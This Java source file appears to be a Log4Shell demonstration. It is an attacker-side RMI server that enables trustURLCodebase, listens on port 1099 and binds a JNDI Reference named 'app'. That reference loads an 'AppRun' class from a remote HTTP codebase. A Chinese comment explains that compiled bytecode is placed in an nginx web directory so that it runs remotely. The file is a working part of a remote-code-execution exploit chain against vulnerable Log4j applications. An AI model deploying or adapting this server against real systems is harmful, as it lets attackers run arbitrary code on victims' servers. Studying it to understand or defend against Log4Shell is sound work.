package com.zhengqing.demo.bug.log4j;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * <p> RMI服务端 </p>
 *
 * @author zhengqingya
 * @description
 * @date 2021/12/12 4:29 下午
 */
public class RmiServer {

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            // 本地执行方式
//            Reference reference = new Reference("App", "App", null);
            // tips:如果是远程执行，需要将`AppRun`编译后的字节码文件放到nginx html访问目录下，再通过如下方式执行程序
            Reference reference = new Reference("AppRun", "AppRun", "http://www.zhengqingya.com:80/");
            registry.bind("app", new ReferenceWrapper(reference));
            System.out.println("Create app registry on port 1099...");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
